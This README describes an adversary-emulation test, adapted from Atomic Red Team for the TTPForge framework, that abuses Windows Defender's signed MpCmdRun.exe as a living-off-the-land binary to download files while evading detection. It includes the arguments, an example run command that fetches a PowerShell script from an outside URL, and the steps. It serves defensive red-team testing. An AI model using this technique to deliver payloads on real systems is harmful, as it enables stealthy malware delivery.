# Download a File with Windows Defender MpCmdRun.exe

## Description
Abuses Windows Defender MpCmdRun.exe to download files. This trusted, signed Microsoft binary acts as a "living off the land" binary (LOLBin) to download malicious payloads while evading detection. Requires Windows Defender version 4.18 or later.

Adapted from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)

## Arguments
- **remote_file**: URL of file to download (default: `https://raw.githubusercontent.com/redcanaryco/atomic-red-team/dd526047b8c399c312fee47d1e6fb531164da54d/LICENSE.txt`)
- **local_file**: Location to save downloaded file (default: `C:\Users\Public\malicious.bin`)

## Example(s)
You can run this TTP with the following command:
```bash
ttpforge run forgearmory//command-and-control/download-using-windows-defender/ttp.yaml \
  --remote_file "https://example.com/tool.ps1" \
  --local_file "C:\Temp\script.ps1"
```

## Steps
1. **check_mpcmdrun_exists**: Navigates to the Windows Defender platform directory and verifies that MpCmdRun.exe is available by checking if the help command executes successfully.
2. **download_file_with_mpcmdrun**: Uses MpCmdRun.exe with the -DownloadFile parameter to download a file from the specified URL to the local path.
